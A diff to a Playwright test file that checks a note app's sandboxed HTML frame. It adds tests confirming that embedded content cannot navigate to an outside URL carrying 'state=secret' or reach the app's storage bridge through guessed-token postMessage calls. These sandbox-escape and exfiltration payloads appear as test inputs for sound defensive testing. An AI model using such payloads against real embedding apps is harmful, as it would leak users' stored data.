@@ -1,4 +1,4 @@
-import type { Locator, Page } from '@playwright/test';
+import type { FrameLocator, Locator, Page } from '@playwright/test';
 import { test, expect } from '../fixtures';
 import { activeEditor, createNote, pastePlainText, screenshotInBothThemes } from '../support/actions';
 import { assertTestOrigin } from '../support/origin-guard';
@@ -130,6 +130,30 @@ async function listenForHeightReport(app: Page, min: number): Promise<() => Prom
   return () => listening.evaluate(({ delivered }) => delivered);
 }
 
+/**
+ * Resolves once the app has handled what `frame` has reported so far: the frame's size
+ * observers run after two animation frames at the latest, and the app answers a port's
+ * messages in order, so by the reply to this request it has seen the height report.
+ */
+const reportsHandled = (frame: FrameLocator) =>
+  frame.locator('html').evaluate(async () => {
+    await new Promise(requestAnimationFrame);
+    await new Promise(requestAnimationFrame);
+    await (window as unknown as { journal: { storage: { get(key: string): Promise<unknown> } } }).journal.storage.get('none');
+  });
+
+/** Records the app's enforced CSP blocking something, as `<directive> <url>`. */
+async function collectBlockedByCsp(app: Page): Promise<() => Promise<string[]>> {
+  const blocked = await app.evaluateHandle(() => {
+    const seen: string[] = [];
+    document.addEventListener('securitypolicyviolation', (event) => {
+      if (event.disposition === 'enforce') seen.push(`${event.effectiveDirective} ${event.blockedURI}`);
+    });
+    return seen;
+  });
+  return () => blocked.evaluate((seen) => seen);
+}
+
 test("html block: its inline script runs in the frame under the app's COEP headers", async ({ reusedApp: app }) => {
   // True only when the page was served with COOP same-origin + COEP require-corp.
   expect(await app.evaluate(() => window.crossOriginIsolated)).toBe(true);
@@ -169,6 +193,74 @@ test('html block: the frame cannot reach the network, storage, the parent docume
   // The app itself still has both, so the checks above were not vacuous.
   expect(await app.evaluate(() => document.cookie)).toContain('e2e-secret=cookie-value');
   expect(await app.evaluate(() => localStorage.getItem('e2e-secret'))).toBe('storage-value');
+
+  // The page's first script took the token that opens the bridge out of the document with it (#945).
+  expect(await frame.locator('html').evaluate((html) => html.outerHTML)).not.toContain('MessageChannel');
+});
+
+// #945: a block must not leave its page for a URL of its choice. No click is needed.
+const ESCAPE_URL = 'https://example.com/escape?state=secret';
+
+for (const [how, source] of [
+  ['location.href', `<script>location.href = '${ESCAPE_URL}';</script>`],
+  ['a meta refresh', `<meta http-equiv="refresh" content="0;url=${ESCAPE_URL}">`],
+  // Stopped on the way up: the link bridge never sees this click.
+  [
+    'a link with target=_self',
+    `<a id="go" target="_self" href="${ESCAPE_URL}">Go</a><script>const go = document.getElementById('go'); go.onclick = (event) => event.stopPropagation(); go.click();</script>`,
+  ],
+] as const) {
+  test(`html block: ${how} sends nothing off the machine`, async ({ reusedApp: app }) => {
+    const requests: string[] = [];
+    await app.context().route(ESCAPE_URL, (route) => {
+      requests.push(route.request().url());
+      return route.fulfill({ contentType: 'text/html', body: 'escaped' });
+    });
+    const blocked = await collectBlockedByCsp(app);
+
+    await previewProbe(app, source);
+
+    await expect.poll(blocked).toEqual([`frame-src ${new URL(ESCAPE_URL).origin}`]);
+    expect(requests).toEqual([]);
+  });
+}
+
+test('html block: a page navigated to in the frame gets no answer from the app', async ({ reusedApp: app }) => {
+  // On the app's origin, which frame-src allows: this is what any other page would get if the CSP were not there.
+  const escapeUrl = new URL('/e2e-escape', app.url()).href;
+  await app.context().route(escapeUrl, (route) =>
+    route.fulfill({
+      contentType: 'text/html',
+      headers: { 'Cross-Origin-Embedder-Policy': 'require-corp', 'Cross-Origin-Resource-Policy': 'cross-origin' },
+      body: [
+        '<!doctype html><pre id="out">asked</pre><script>',
+        "const out = document.getElementById('out');",
+        "const report = (event) => { out.textContent += ' answered ' + JSON.stringify(event.data); };",
+        "addEventListener('message', report);",
+        'const channel = new MessageChannel();',
+        'channel.port1.onmessage = report;',
+        // The old bridge on the window, and a port offered with a guess at the token.
+        "parent.postMessage({ journalLiveBlock: 1, storage: 'get', request: 1, key: 'secret' }, '*');",
+        "parent.postMessage({ journalLiveBlock: 1, bridge: 'guess' }, '*', [channel.port2]);",
+        "channel.port1.postMessage({ journalLiveBlock: 1, storage: 'get', request: 2, key: 'secret' });",
+        "parent.postMessage({ journalLiveBlock: 1, height: 5000 }, '*');",
+        '</script>',
+      ].join(''),
+    }),
+  );
+  const asked = await listenForHeightReport(app, 5000);
+
+  const frame = await previewProbe(
+    app,
+    `<p id="ran">saving</p><script>journal.storage.set('secret', 'state').then(() => { location.href = '${escapeUrl}'; });</script>`,
+  );
+
+  await asked();
+  await expect(frame.locator('#out')).toHaveText('asked');
+  // A reply to the window would be in the frame's queue by now: the app answered in the message's own task.
+  await frame.locator('html').evaluate(() => new Promise((resolve) => setTimeout(resolve)));
+  await expect(frame.locator('#out')).toHaveText('asked');
+  await expect(resizableBox(app)).not.toHaveCSS('height', '1600px');
 });
 
 test('html block: a clicked web link opens in a new tab, and the frame stays put', async ({ reusedApp: app }) => {
@@ -250,9 +342,8 @@ test('html block: is as tall as its content and grows with it, until the user re
   // A height the user drags the block to wins over what the content reports next.
   await dragResizeHandle(app, resizable, -100);
   await expect(resizable).toHaveCSS('height', '1200px');
-  const reported = await listenForHeightReport(app, 1700);
   await grow.click();
-  await reported();
+  await reportsHandled(frame);
   await expect(resizable).toHaveCSS('height', '1200px');
 });
 
